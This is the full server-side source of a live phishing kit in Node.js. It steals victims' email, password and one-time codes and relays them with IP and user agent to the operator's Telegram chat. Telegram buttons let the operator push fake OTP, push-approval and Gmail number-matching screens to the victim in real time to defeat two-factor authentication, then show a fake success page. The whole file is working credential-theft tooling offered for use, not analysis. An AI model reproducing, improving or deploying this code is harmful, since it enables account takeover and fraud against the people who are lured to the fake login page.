const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
dotenv.config();
const cors = require('cors');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_BOT2_TOKEN = process.env.TELEGRAM_BOT2_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
  polling: true,
   request: {
    timeout: 30000  // 30 seconds timeout instead of default
  } 
}); 
const bot2 = new TelegramBot(TELEGRAM_BOT2_TOKEN);

// Add error handler to suppress any remaining errors
bot.on('polling_error', (error) => {
  // Silently ignore
});

bot.on('error', (error) => {
  // Silently ignore  
});


// Store active sessions
const sessions = new Map(); 

function generateUniqueId() {
  return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
} 


// -------------------- Express route --------------------
app.post('/start-session', (req, res) => {
  const { sessionId } = req.body; // get sessionId from client
  let session = sessions.get(sessionId);

  if (!session) return res.status(404).send('Session not found');

  session.ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.socket.remoteAddress;

  session.userAgent = req.headers['user-agent'];
  session.socketId = req.body.socketId; // update socketId
  
  //notify bot 
  const message = `🌐 *New Session Started*\n\n` +
    `*Session ID:* \`${sessionId}\`\n` +
    `*IP Address:* ${session.ip}\n` +
    `*User Agent:* ${session.userAgent}\n` +
    `*Status:* Active`;

  try {
    bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Telegram error:', error);
  }

  console.log(`Session ${sessionId} started with IP: ${session.ip} and User Agent: ${session.userAgent}`);

  res.send('ok');
});




// -------------------- Socket.io connection --------------------
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
 // don't emit new session id yet , because frontend may need to reconnect to existing session 
   socket.on('reconnect-session', (data) => {
    let session = sessions.get(data.sessionId);
    if (session) {
      console.log(`Updating socket for session ${data.sessionId}: ${session.socketId} → ${socket.id}`);
      session.socketId = socket.id; // Update to new socket ID 
      //notify bot
      bot.sendMessage(TELEGRAM_CHAT_ID, `🔄 *Session Reconnected*\n\n*Session ID:* \`${data.sessionId}\`\n*New Socket ID:* \`${socket.id}\``, { parse_mode: 'Markdown' });
    }  else {
      console.log(`Session ${data.sessionId} not found for reconnection.`); 
    // Session doesn't exist! Server must have restarted
    // Tell frontend to reset and start fresh
    socket.emit('session-invalid');
    return; 
    }
  }); 
  

  //for new session requests
   socket.on('request-new-session', () => {
     const sessionId = generateUniqueId();   
     // Send sessionId to frontend
  socket.emit('your-session-id', sessionId);
  // Store socket session
  sessions.set(sessionId, {
    socketId: socket.id,
    provider: null,
    email: null,
    password: null,
    otp: null,
    timestamp: new Date()
  });   
  console.log(`New session created: ${sessionId} for socket ${socket.id}`);
  });



  // Handle email submission
  socket.on('submit-email', async (data) => {
    let session = sessions.get(data.sessionId);
    session.provider = data.provider;
    session.email = data.email;
    
    console.log('Email submitted:', data);

    const message = `📧 *New Login Attempt*\n\n` +
      `*Provider:* ${data.provider}\n` +
      `*Email:* ${data.email}\n` +
      `*Status:* Waiting for password...\n` +
      `*Session:* \`${data.sessionId}\``;

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  // Handle password submission
  socket.on('submit-password', async (data) => {
    let session = sessions.get(data.sessionId);
    session.password = data.password;
    
    console.log('Password submitted:', data);

    const message = `🔐 *Password Received*\n\n` +
      `*Provider:* ${session.provider}\n` +
      `*Email:* ${session.email}\n` +
       `*Password:* ${data.password}\n` +
      `*Session:* \`${data.sessionId}\``;



     // Different keyboard for Gmail vs others
  const keyboard = session.provider === 'Gmail' ? {
    inline_keyboard: [
      [
        { text: '✅ Send OTP', callback_data: `send_otp_${data.sessionId}` }
      ],
      [
        { text: '✅ Send Approve only', callback_data: `send_approve_${data.sessionId}` }
      ],
      [
        { text: '🔢 Send Approve with Special Number', callback_data: `send_approve_with_number_${data.sessionId}` }  
      ],
      [
        { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
      ],
      [
        { text: '❌ Reject', callback_data: `reject_${data.sessionId}` }
      ]
    ]
  } : {
    inline_keyboard: [
      [
        { text: '✅ Send OTP', callback_data: `send_otp_${data.sessionId}` },
        { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
      ],
      [
        { text: '❌ Reject', callback_data: `reject_${data.sessionId}` }
      ]
    ]
  }; 



    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });

  // Handle OTP submission
  socket.on('submit-otp', async (data) => {
    let session = sessions.get(data.sessionId);
    session.otp = data.otp;
    
    console.log('OTP submitted:', data);
    // recheck session infos
      console.log('Session data:', session);

    const message = `🔢 *OTP Submitted*\n\n` +
      `*Provider:* ${session.provider}\n` +
      `*Email:* ${session.email}\n` +
      `*OTP Code:* \`${session.otp}\`\n` +
      `*Session:* \`${data.sessionId}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '✔️ Mark Complete', callback_data: `mark_complete_${data.sessionId}` }
        ],
        [
          { text: '🔄 Request Again', callback_data: `request_again_${data.sessionId}` }
        ]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, {
        parse_mode: 'Markdown',
        reply_markup: keyboard
      });  
    } catch (error) {
      console.error('Telegram error:', error);
    }
  });      

  // Handle disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id); 
  });
});

// Telegram bot callback handlers
bot.on('callback_query', async (callbackQuery) => { 
  const messageId = callbackQuery.message.message_id;
  const chatId = callbackQuery.message.chat.id; 
  const data = callbackQuery.data; // e.g., "send_otp_qf9IUm6UEPQcrjogAAAE"
  const parts = data.split('_');

  const sessionId = parts[parts.length - 1]; // LAST part is the session ID
  const action = parts.slice(0, -1).join('_'); // everything else = action, e.g., "send_otp"

   let session = sessions.get(sessionId);   


    
  // DEBUG LOGS
  console.log('=== CALLBACK DEBUG ===');
  console.log('Full data:', data);
  console.log('Parsed sessionId:', sessionId);
  console.log('Available sessions:', Array.from(sessions.keys()));
  console.log('Session exists?', sessions.has(sessionId));
 




  // tiny delay to allow session to finish initializing
if (!session) {
  await new Promise(res => setTimeout(res, 50)); // 50ms delay
  session = sessions.get(sessionId);
}


  if (!session) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '❌ Session expired or user disconnected',
      show_alert: true
    });
    return;
  }


   // ✅ NOW GET SOCKET USING socketId FROM SESSION
  const socket = io.sockets.sockets.get(session.socketId);

    if (!socket || !socket.connected) {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '❌ User disconnected',
      show_alert: true
    });
    return;
  }   



  //ADD REAL connection test - try to actually send something small
  // Before sending any event, TEST if socket can actually receive
try {
  // Create a promise that rejects if no response in 2 seconds
  await new Promise((resolve, reject) => {
    const timeout = setTimeout(() => reject(new Error('timeout')), 2000);
    
    socket.emit('connection-test', {}, (ack) => {
      clearTimeout(timeout);
      resolve();
    });
  });
} catch (err) {
   // Socket is DEAD! Don't send the real event
  console.log('Socket test failed:', err.message);
  await bot.answerCallbackQuery(callbackQuery.id, {
    text: '❌ User disconnected or not responding',
    show_alert: true
  });
  return;
} 

  switch (action) {
    case 'send_otp': {
      await bot.answerCallbackQuery(callbackQuery.id, {
      text: '✅ OTP screen sent to user'
    });
      console.log('Sending OTP screen to session:', sessionId);
      console.log('=== SEND OTP DEBUG ===');
      console.log('Session ID:', sessionId);
      console.log('Socket exists?', !!socket);
      console.log('Socket connected?', socket?.connected); 
      // recheck session infos
      console.log('Session data:', session);
    socket.emit('show-otp-screen');
    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
    break;  
  }

    

     case 'send_approve': {   
      await bot.answerCallbackQuery(callbackQuery.id); 
       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
      socket.emit('show-approve-screen');
      await bot.sendMessage(chatId, '✅ Sent Approve screen to user'); 
      break;
    }


        case 'send_approve_with_number': {   
      await bot.answerCallbackQuery(callbackQuery.id);
       await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
      await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
      
      // Wait for the number input
      bot.once('message', async (msg) => {
        if (msg.chat.id === chatId) {
          const specialNumber = msg.text;
          
          // Store it in session
          let session = sessions.get(sessionId);
          if (session) {
            session.specialNumber = specialNumber;
          }
          
          // Send to frontend
          socket.emit('show-approve-with-number', { number: specialNumber });
          
          await bot.sendMessage(chatId, `✅ Sent approve screen with special number: ${specialNumber}`);
        }
      });
      break;
    }




    case 'mark_complete': {
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: '✅ Marked as complete! User sees success page.'
    });
    socket.emit('show-success-screen');
    await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: messageId
    });
    let session = sessions.get(sessionId);
   const summary = `✅ *Session Completed*\n` +
                `\`=== ${session.provider.toUpperCase()} ===\`\n\n` +
                `*Provider:* ${session.provider}\n` +
                `*Email:* ${session.email}\n` + 
                `*Password:* ${session.password || 'N/A'}\n` +
                `*IP Address:* ${session.ip || 'N/A'}\n` +
                `*USER AGENT:* ${session.userAgent || 'N/A'}\n` + 
                `*Time:* ${new Date().toLocaleString()}`; 
    await bot2.sendMessage(TELEGRAM_CHAT_ID, summary, { parse_mode: 'Markdown' });
    break;
  }



   case 'request_again': {
  await bot.answerCallbackQuery(callbackQuery.id);
  
  // Ask which screen to show
  const keyboard = {
    inline_keyboard: [
      [
        { text: '🔢 OTP Screen', callback_data: `resend_otp_${sessionId}` }
      ],
      [
        { text: '✅ Approve Screen', callback_data: `resend_approve_${sessionId}` }
      ],
      [
        { text: '🔢 Approve with Number', callback_data: `resend_approve_number_${sessionId}` }
      ]
    ]
  };
  
  await bot.sendMessage(chatId, '🔄 Which screen do you want to show again?', {
    reply_markup: keyboard
  });
  break;
} 


case 'resend_otp': {
  await bot.answerCallbackQuery(callbackQuery.id, {
    text: '✅ OTP screen sent again'
  });
  socket.emit('show-otp-screen');
  break;
}

case 'resend_approve': {
  await bot.answerCallbackQuery(callbackQuery.id, {
    text: '✅ Approve screen sent again'
  });
  socket.emit('show-approve-screen');
  break;
}

case 'resend_approve_number': {
  await bot.answerCallbackQuery(callbackQuery.id);
  await bot.sendMessage(chatId, '🔢 Enter the special number to send (1-99):');
  
  bot.once('message', async (msg) => {
    if (msg.chat.id === chatId) {
      const specialNumber = msg.text;
      socket.emit('show-approve-with-number', { number: specialNumber });
      await bot.sendMessage(chatId, `✅ Sent approve screen with number: ${specialNumber}`);
    }
  });
  break;
}




    case 'reject': {
      // Reject session
      socket.emit('show-error', { message: 'Authentication failed. Please try again.' });
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: '❌ Session rejected'
      });
      await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: messageId
      }); 
      break; 
    }
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    activeSessions: sessions.size,
    timestamp: new Date()
  });
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot is active`);
  console.log(`🔌 Socket.io server is ready`);
});

// Error handling
process.on('unhandledRejection', (error) => {
  console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught exception:', error);
});